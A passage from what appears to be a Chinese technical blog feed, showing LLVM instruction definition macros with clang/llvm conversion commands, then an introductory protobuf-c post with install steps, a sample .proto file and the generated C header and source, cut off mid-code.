class="keyword">define</span> LAST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_CAST_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_CAST_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_USER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_USER_INST(num, opc, Class) HANDLE_OTHER_INST(num, opc, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Terminator Instructions - These instructions are used to terminate a basic</span></span><br><span class="line"><span class="comment">// block of the program.   Every basic block must end with one of these</span></span><br><span class="line"><span class="comment">// instructions for it to be a well formed basic block.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"> FIRST_TERM_INST  ( <span class="number">1</span>)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">1</span>, Ret           , ReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">2</span>, Br            , BranchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">3</span>, Switch        , SwitchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">4</span>, IndirectBr    , IndirectBrInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">5</span>, Invoke        , InvokeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">6</span>, Resume        , ResumeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">7</span>, Unreachable   , UnreachableInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">8</span>, CleanupRet    , CleanupReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">9</span>, CatchRet      , CatchReturnInst)</span><br><span class="line">HANDLE_TERM_INST  (<span class="number">10</span>, CatchSwitch   , CatchSwitchInst)</span><br><span class="line">  LAST_TERM_INST  (<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard unary operators...</span></span><br><span class="line"> FIRST_UNARY_INST(<span class="number">11</span>)</span><br><span class="line">HANDLE_UNARY_INST(<span class="number">11</span>, FNeg  , UnaryOperator)</span><br><span class="line">  LAST_UNARY_INST(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard binary operators...</span></span><br><span class="line"> FIRST_BINARY_INST(<span class="number">12</span>)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">12</span>, Add  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">13</span>, FAdd , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">14</span>, Sub  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">15</span>, FSub , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">16</span>, Mul  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">17</span>, FMul , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">18</span>, UDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">19</span>, SDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">20</span>, FDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">21</span>, URem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">22</span>, SRem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">23</span>, FRem , BinaryOperator)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logical operators (integer operands)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">24</span>, Shl  , BinaryOperator) <span class="comment">// Shift left  (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">25</span>, LShr , BinaryOperator) <span class="comment">// Shift right (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">26</span>, AShr , BinaryOperator) <span class="comment">// Shift right (arithmetic)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">27</span>, And  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">28</span>, Or   , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">29</span>, Xor  , BinaryOperator)</span><br><span class="line">  LAST_BINARY_INST(<span class="number">29</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory operators...</span></span><br><span class="line"> FIRST_MEMORY_INST(<span class="number">30</span>)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">30</span>, Alloca, AllocaInst)  <span class="comment">// Stack management</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">31</span>, Load  , LoadInst  )  <span class="comment">// Memory manipulation instrs</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">32</span>, Store , StoreInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">33</span>, GetElementPtr, GetElementPtrInst)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">34</span>, Fence , FenceInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">35</span>, AtomicCmpXchg , AtomicCmpXchgInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">36</span>, AtomicRMW , AtomicRMWInst )</span><br><span class="line">  LAST_MEMORY_INST(<span class="number">36</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cast operators ...</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> The order matters here because CastInst::isEliminableCastPair</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> (see Instructions.cpp) encodes a table based on this ordering.</span></span><br><span class="line"> FIRST_CAST_INST(<span class="number">37</span>)</span><br><span class="line">HANDLE_CAST_INST(<span class="number">37</span>, Trunc   , TruncInst   )  <span class="comment">// Truncate integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">38</span>, ZExt    , ZExtInst    )  <span class="comment">// Zero extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">39</span>, SExt    , SExtInst    )  <span class="comment">// Sign extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">40</span>, FPToUI  , FPToUIInst  )  <span class="comment">// floating point -&gt; UInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">41</span>, FPToSI  , FPToSIInst  )  <span class="comment">// floating point -&gt; SInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">42</span>, UIToFP  , UIToFPInst  )  <span class="comment">// UInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">43</span>, SIToFP  , SIToFPInst  )  <span class="comment">// SInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">44</span>, FPTrunc , FPTruncInst )  <span class="comment">// Truncate floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">45</span>, FPExt   , FPExtInst   )  <span class="comment">// Extend floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">46</span>, PtrToInt, PtrToIntInst)  <span class="comment">// Pointer -&gt; Integer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">47</span>, IntToPtr, IntToPtrInst)  <span class="comment">// Integer -&gt; Pointer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">48</span>, BitCast , BitCastInst )  <span class="comment">// Type cast</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">49</span>, AddrSpaceCast, AddrSpaceCastInst)  <span class="comment">// addrspace cast</span></span><br><span class="line">  LAST_CAST_INST(<span class="number">49</span>)</span><br><span class="line"></span><br><span class="line"> FIRST_FUNCLETPAD_INST(<span class="number">50</span>)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">50</span>, CleanupPad, CleanupPadInst)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">51</span>, CatchPad  , CatchPadInst)</span><br><span class="line">  LAST_FUNCLETPAD_INST(<span class="number">51</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Other operators...</span></span><br><span class="line"> FIRST_OTHER_INST(<span class="number">52</span>)</span><br><span class="line">HANDLE_OTHER_INST(<span class="number">52</span>, ICmp   , ICmpInst   )  <span class="comment">// Integer comparison instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">53</span>, FCmp   , FCmpInst   )  <span class="comment">// Floating point comparison instr.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">54</span>, PHI    , PHINode    )  <span class="comment">// PHI node instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">55</span>, Call   , CallInst   )  <span class="comment">// Call a function</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">56</span>, Select , SelectInst )  <span class="comment">// select instruction</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">57</span>, UserOp1, Instruction)  <span class="comment">// May be used internally in a pass</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">58</span>, UserOp2, Instruction)  <span class="comment">// Internal to passes only</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">59</span>, VAArg  , VAArgInst  )  <span class="comment">// vaarg instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">60</span>, ExtractElement, ExtractElementInst)<span class="comment">// extract from vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">61</span>, InsertElement, InsertElementInst)  <span class="comment">// insert into vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">62</span>, ShuffleVector, ShuffleVectorInst)  <span class="comment">// shuffle two vectors.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">63</span>, ExtractValue, ExtractValueInst)<span class="comment">// extract from aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">64</span>, InsertValue, InsertValueInst)  <span class="comment">// insert into aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">65</span>, LandingPad, LandingPadInst)  <span class="comment">// Landing pad instruction.</span></span><br><span class="line">  LAST_OTHER_INST(<span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_TERM_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_UNARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_BINARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_MEMORY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_CAST_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_FUNCLETPAD_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_OTHER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_USER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h2 id="格式转化"><a href="#格式转化" class="headerlink" title="格式转化"></a>格式转化</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">哈人</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="llvm-pass" scheme="https://ixout.github.io/tags/llvm-pass/"/>
    
  </entry>
  
  <entry>
    <title>protobuf初识</title>
    <link href="https://ixout.github.io/posts/46596/"/>
    <id>https://ixout.github.io/posts/46596/</id>
    <published>2024-04-11T15:24:20.000Z</published>
    <updated>2024-04-18T09:11:31.844Z</updated>
    
    <content type="html"><![CDATA[<h1 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h1><p>Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的<strong>序列化结构的数据格式</strong>，用于将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构。</p><p>所以很适合做数据存储和为不同语言，不同应用之间互相通信的数据交换格式，只要实现相同的协议格式，即后缀为proto文件被编译成不同的语言版本，加入各自的项目中，这样不同的语言可以解析其它语言通过Protobuf序列化的数据。目前官方提供c++，java，go等语言支持。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install protobuf</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/protobuf-c/protobuf-c.git</span><br><span class="line">sudo apt install autoconf, automake, libtool,libprotobuf-dev,libprotoc-dev,protobuf-compiler</span><br><span class="line">./autogen.sh </span><br><span class="line">./configure --prefix=/usr/local/protobuf-c --libdir=/usr/lib </span><br><span class="line">make -j8 &amp;&amp; make install</span><br><span class="line">sudo <span class="built_in">cp</span> -r /usr/local/protobuf-c/include/protobuf-c /usr/include</span><br><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/protobuf-c/bin/protoc-gen-c /usr/local/bin/protoc-c</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>写个例子尝试一下</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msg.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">string</span> email = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行</p><p><code>protoc-c --c_out=. msg.proto</code></p><p>可以看到生成了两个文件</p><p><code>msg.pb-c.c</code>与<code>msg.pb-c.h</code></p><p>后者文件中声明了许多结构体与函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: msg.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROTOBUF_C_msg_2eproto__INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTOBUF_C_msg_2eproto__INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;protobuf-c/protobuf-c.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PROTOBUF_C__BEGIN_DECLS</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PROTOBUF_C_VERSION_NUMBER &lt; 1000000</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> 1005000 &lt; PROTOBUF_C_MIN_COMPILER_VERSION</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Person</span> <span class="title">Person</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- enums --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- messages --- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="type">int32_t</span> id;</span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">char</span> *email;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PERSON__INIT \</span></span><br><span class="line"><span class="meta"> &#123; PROTOBUF_C_MESSAGE_INIT (&amp;person__descriptor) \</span></span><br><span class="line"><span class="meta">    , 0, NULL, NULL &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Person methods */</span></span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__init</span></span><br><span class="line">                     <span class="params">(Person         *message)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__get_packed_size</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span>             *out)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack_to_buffer</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message,</span></span><br><span class="line"><span class="params">                      ProtobufCBuffer     *buffer)</span>;</span><br><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span>;</span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__free_unpacked</span></span><br><span class="line">                     <span class="params">(Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCAllocator *allocator)</span>;</span><br><span class="line"><span class="comment">/* --- per-message closures --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*Person_Closure)</span></span><br><span class="line">                 <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                  <span class="type">void</span> *closure_data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- services --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- descriptors --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> ProtobufCMessageDescriptor person__descriptor;</span><br><span class="line"></span><br><span class="line">PROTOBUF_C__END_DECLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">/* PROTOBUF_C_msg_2eproto__INCLUDED */</span></span></span><br></pre></td></tr></table></figure><p>然后便是.c文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: msg.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not generate deprecated warnings for self */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;msg.pb-c.h&quot;</span></span></span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__init</span></span><br><span class="line">                     <span class="params">(Person         *message)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> Person init_value = PERSON__INIT;</span><br><span class="line">  *message = init_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title 